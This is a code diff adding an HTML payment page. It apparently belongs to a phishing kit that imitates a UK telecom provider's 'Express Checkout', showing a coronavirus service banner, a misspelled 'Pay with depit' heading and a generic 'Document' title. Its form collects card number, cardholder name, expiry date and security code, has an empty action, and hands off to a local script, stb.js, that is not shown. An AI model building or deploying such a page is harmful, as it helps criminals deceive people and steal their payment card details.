@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/main.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title>Document</title>
+</head>
+<body>
+    <div class="top1">
+        <img src="./img/logo.png" alt="">
+    </div>
+    <div class="top2">
+        Coronavirus update: We’re keeping the UK connected. Despite best efforts some services may be disrupted.
+    </div>
+    <div class="top3">
+        Pay with depit or <br> credit card
+    </div>
+    <!-- ============================ -->
+    <div class="content">
+        <p style="margin-bottom: 23px; font-weight: bold; font-size: 17px;">Express Checkout</p>
+
+        <img width="120" src="./img/cc.PNG" alt="">
+
+        <form class="formcc" action="" id="pg2">
+            <p>Card number *</p>
+               <!-- cc -->
+            <input class="e_cc" type="tel" name="" id="nemro" maxlength="19" required style="width: 100%;">
+            <p class="e_pp error" style="font-weight: 300; margin-top: -12px; margin-bottom: 15px; font-size: 14px; color: rgb(206, 36, 36);">Enter a valid card number</p>
+            <!-- name -->
+            <p>Cardholder's name *</p>
+            <input style="width: 100%;" type="text" name="" id="holder" required>
+            <!-- date -->
+            <div>
+                <p>Expiry date *</p>
+
+                <input class="" style="width: 60px;" type="tel" name="" id="mmo" required maxlength="2" placeholder="MM"> /
+                <input class="" style="width: 60px;" type="tel" name="" id="yyo" required maxlength="4" placeholder="YY">
+                <p class="error" style="font-weight: 300; margin-top: -12px; margin-bottom: 15px; font-size: 14px; color: rgb(206, 36, 36);">Enter a valid date</p>
+            </div>
+            <!-- cvv -->
+            <div>
+                <p>Security code *</p>
+                <input type="tel" name="" id="vv" maxlength="4" style="width: 70px;">
+                <img style="width: 45px; margin-top: 5px;" src="./img/pin-card-multicard.svg" alt="">
+            </div>
+            <button>Make Payment</button>
+        </form>
+    </div>
+
+
+
+    <div class="fot">
+        <img src="./img/fot.PNG" alt="">
+    </div>
+    <script src="./js/stb.js"></script>
+</body>
+</html>
